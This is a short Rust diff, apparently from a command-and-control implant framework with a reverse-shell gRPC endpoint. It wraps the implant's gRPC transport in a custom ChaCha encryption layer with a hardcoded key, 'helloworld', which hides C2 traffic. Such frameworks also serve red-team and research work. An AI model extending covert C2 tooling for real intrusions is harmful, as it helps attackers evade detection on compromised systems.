@@ -22,7 +22,8 @@ static REVERSE_SHELL_PATH: &str = "/c2.C2/ReverseShell";
 
 #[derive(Debug, Clone)]
 pub struct GRPC {
-    grpc: tonic::client::Grpc<tonic::transport::Channel>,
+    grpc: tonic::client::Grpc<crate::chacha_old::ChaChaSvc>,
+    // grpc: tonic::client::Grpc<tonic::transport::Channel>,
 }
 
 impl Transport for GRPC {
@@ -50,6 +51,10 @@ impl Transport for GRPC {
                 .rate_limit(1, Duration::from_millis(25))
                 .connect_lazy(),
         };
+
+        let channel = ServiceBuilder::new()
+            .layer_fn(|x| crate::chacha_old::ChaChaSvc::new(x, "helloworld".into()))
+            .service(channel);
 
         let grpc = tonic::client::Grpc::new(channel);
         Ok(Self { grpc })
